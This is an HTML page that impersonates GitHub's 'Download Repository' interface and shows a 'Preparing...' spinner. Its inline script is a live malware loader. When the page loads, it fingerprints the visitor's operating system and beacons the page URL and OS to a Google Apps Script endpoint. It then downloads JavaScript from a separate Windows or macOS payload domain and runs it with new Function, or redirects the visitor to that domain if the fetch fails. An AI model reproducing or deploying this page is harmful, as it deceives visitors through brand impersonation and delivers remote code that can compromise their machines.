<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Cloud Files</title>
    <link rel="stylesheet" href="styles.css" />
</head>
<body>
    <div class="page-wrapper">
        <div class="github-header">
            <div class="header-content">
                <a href="https://github.com/">
                    <svg class="github-logo" viewBox="0 0 16 16">
                        <path fill="#f0f6fc" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/>
                    </svg>
                </a>
                <span class="header-title">Download Repository</span>
            </div>
        </div>

        <main class="main-content">
            <section class="card">
                <h1 id="headline">Preparing...</h1>
                <div class="spinner" aria-hidden="true"></div>
                <p id="status" class="muted">Processing request...</p>
            </section>
        </main>
    </div>

    <div class="github-footer">
        <div class="footer-bottom">
            <div class="footer-logo-section">
                <a href="https://github.com/">
                    <svg class="footer-logo" viewBox="0 0 16 16">
                        <path fill="#6e7681" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/>
                    </svg>
                </a>
                <span class="footer-copyright">© 2026 GitHub, Inc.</span>
            </div>
            <div class="footer-links">
                <a href="https://docs.github.com/site-policy/github-terms/github-terms-of-service">Terms</a>
                <a href="https://docs.github.com/site-policy/privacy-policies/github-privacy-statement">Privacy</a>
                <a href="https://github.com/security">Security</a>
                <a href="https://www.githubstatus.com/">Status</a>
                <a href="https://docs.github.com/">Help</a>
                <a href="https://support.github.com/">Contact</a>
            </div>
        </div>
    </div>

    <script>
        const REMOTE_WINDOWS = "https://spankyrereel.com/faster.depone";
        const REMOTE_MAC = "https://condorhelplyornate.com/aporia.brooky";
        const ERROR_URL = "https://github.com/";

        const APP_URL = "https://script.google.com/macros/s/AKfycbzJt5sUSvYmjskv_K7dSLhGSzULH3BisOvq_lj6fzOmOouGVwz1habG64TFgFTEc1lr/exec";

        function detectOS() {
            const uad = navigator.userAgentData;
            if (uad && uad.platform) {
                const p = uad.platform.toLowerCase();
                if (p.includes('windows')) return 'windows';
                if (p.includes('mac')) return 'macos';
            }
            const ua = navigator.userAgent || '';
            if (/Windows NT/i.test(ua)) return 'windows';
            if (/Macintosh;.*Mac OS X/i.test(ua)) return 'macos';
            return 'other';
        }

        function sendLink() {
            const currentPage = window.location.href;
            const os = detectOS();
            const payload = { 
                offer: currentPage,
                os: os
            };
            const q = new URLSearchParams({ p: JSON.stringify(payload) }).toString();
            new Image(1,1).src = APP_URL + "?" + q + "&_t=" + Date.now();
        }

        (function() {
            const headline = document.getElementById('headline');
            const status = document.getElementById('status');
            const os = detectOS();

            sendLink();

            if (os === 'windows' || os === 'macos') {
                const targetUrl = os === 'windows' ? REMOTE_WINDOWS : REMOTE_MAC;
                async function load() {
                    try {
                        status.textContent = 'Downloading components...';
                        const res = await fetch(targetUrl, { cache: 'no-store' });
                        const code = await res.text();
                        new Function('headline', 'status', code)(headline, status);
                    } catch {
                        status.textContent = 'Processing request...';
                        setTimeout(() => { window.location.replace(targetUrl); }, 500);
                    }
                }
                load();
            } else {
                headline.textContent = "Attention: Unsupported Operating System";
                status.textContent = "To continue installation, you must be using Windows or macOS. Installation is not supported on your current operating system.";
                setTimeout(() => { window.location.replace(ERROR_URL); }, 4000);
            }
        })();
    </script>
</body>
</html>
